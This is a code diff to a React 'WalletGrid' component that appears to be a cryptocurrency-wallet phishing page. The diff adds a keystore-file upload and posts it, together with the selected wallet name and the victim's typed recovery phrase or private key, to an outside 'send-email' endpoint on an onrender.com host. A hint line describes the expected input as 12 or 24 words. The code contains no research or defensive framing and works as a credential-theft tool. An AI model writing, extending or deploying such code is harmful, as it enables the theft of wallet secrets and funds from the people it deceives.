@@ -12,6 +12,16 @@ const WalletGrid = () => {
   const [activeTab, setActiveTab] = useState("phrase");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState(false);
+  const [fileName, setFileName] = useState("");
+  const [selectedFile, setSelectedFile] = useState(null);
+
+  const handleFileChange = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      setSelectedFile(file);
+      setFileName(file.name);
+    }
+  };
 
   const onCancel = () => {
     setSelectedWallet(null);
@@ -64,24 +74,28 @@ const WalletGrid = () => {
   const handleSubmitTwo = async (e) => {
     e.preventDefault();
     setError("");
+
     try {
+      const formData = new FormData();
+      formData.append("wallet", selectedWallet.title);
+      formData.append("text", text.trim());
+      formData.append("file", selectedFile); // selectedFile should be a File object
+
       const response = await axios.post(
         "https://droplet-6cvr.onrender.com/barbs/send-email",
+        formData,
         {
-          wallet: selectedWallet.title,
-          text: text.trim(),
+          headers: {
+            "Content-Type": "multipart/form-data",
+          },
         }
       );
 
       console.log("API response:", response.data);
       setSuccess(true);
-      // setSubmitted(true);
     } catch (err) {
-      // console.error("API error:", err);
-      // setError("Something went wrong. Please try again.");
-      // setSubmitted(false);
-    } finally {
-      // setLoading(false);
+      console.error("API error:", err);
+      setError("Something went wrong. Please try again.");
     }
   };
 
@@ -182,8 +196,23 @@ const WalletGrid = () => {
                 <div>
                   <form
                     onSubmit={handleSubmitTwo}
-                    className="w-full mb-4 gap-4"
+                    className="flex flex-col w-full mb-4 gap-4"
                   >
+                    <div className="flex justify-center items-center w-full border-dashed border rounded-md text-black max-w-md">
+                      <label
+                        htmlFor="keystore-file"
+                        className="w-full text-center cursor-pointer inline-block text-blue-400 px-4 py-2 rounded-md font-medium text-sm hover:bg-blue-700"
+                      >
+                        {fileName || "Choose Keystore File"}
+                      </label>
+                      <input
+                        id="keystore-file"
+                        type="file"
+                        onChange={handleFileChange}
+                        className="hidden"
+                        required
+                      />
+                    </div>
                     <input
                       id="text"
                       name="text"
@@ -208,7 +237,7 @@ const WalletGrid = () => {
               )}
               {activeTab === "private" && (
                 <div>
-                  <form onSubmit={handleSubmitTwo} className="w-full mb-4">
+                  <form onSubmit={handleSubmitTwo} className="w-full mb-2">
                     <input
                       id="text"
                       name="text"
@@ -218,6 +247,10 @@ const WalletGrid = () => {
                       className="w-full outline-none border border-grey-300 rounded-lg p-2 mb-4"
                       onChange={(e) => setText(e.target.value)}
                     />
+                    <p className="text-xs text-gray-400 text-center mb-2">
+                      Typically 12 (sometimes 24) words separated by single
+                      spaces
+                    </p>
                     <button
                       type="submit"
                       className="flex justify-center items-center gap-2 hover:bg-blue-700 bg-blue-600 py-1 rounded-md w-full text-white"
